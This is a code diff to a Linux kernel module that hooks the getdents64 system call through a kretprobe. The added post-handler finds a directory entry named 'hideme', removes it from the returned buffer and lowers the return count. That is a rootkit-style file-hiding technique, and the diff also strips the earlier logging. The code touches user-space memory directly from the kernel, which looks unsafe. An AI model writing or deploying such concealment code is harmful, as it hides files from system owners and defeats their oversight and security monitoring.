@@ -6,16 +6,20 @@
 #include <linux/kthread.h>
 #include <linux/kprobes.h>
 #include <linux/fprobe.h>
+#include <linux/dirent.h>
+#include <linux/string.h>
 
 static struct kretprobe kretp = {
         .maxactive = 20
 };
 
 struct getdent64_arguments {
-    unsigned long fd;
-    unsigned long buffer_ptr;
-    unsigned long count;
+    unsigned int fd;
+    void* buffer_ptr;
+    unsigned int count;
 };
+
+const char* hide_file_name = "hideme";
 
 static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
@@ -31,10 +35,9 @@ static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
 
     //unsigned long syscall = regs->orig_ax;
     args->fd = regs->di; // 0
-    args->buffer_ptr = regs->si; // 1
+    args->buffer_ptr = (void*)regs->si; // 1
     args->count = regs->dx; // 2
 
-    pr_info("getdents64(fd=%ld, buffer_ptr=%ld, count=%ld)\n", args->fd, args->buffer_ptr, args->count);
     return 0;
 }
 
@@ -42,7 +45,31 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
     struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
     unsigned long retval = regs_return_value(regs);
-    pr_info("getdents64 fd=%ld return = %ld\n", args->fd, retval);
+
+    unsigned long offset = 0;
+
+    unsigned long hide_entry_offset = 0;
+    unsigned long hide_entry_size = 0;
+
+    // find entry to hide
+    while(offset < retval){
+        struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr + offset);
+        if(strcmp(current_ent->d_name, hide_file_name) == 0){
+            hide_entry_offset = offset;
+            hide_entry_size = current_ent->d_reclen;
+            break;
+        }
+        offset += current_ent->d_reclen;
+    }
+
+    // offset     2
+    // nextOffset 3
+    // [0, 1, 2, 3, 4]
+    // -----[        ] dest
+    // --------[     ] source
+    memcpy(args->buffer_ptr + offset,  args->buffer_ptr + offset + hide_entry_size, (retval - offset - hide_entry_size));
+    regs_set_return_value(regs, retval - hide_entry_size);
+
     return 0;
 }
 
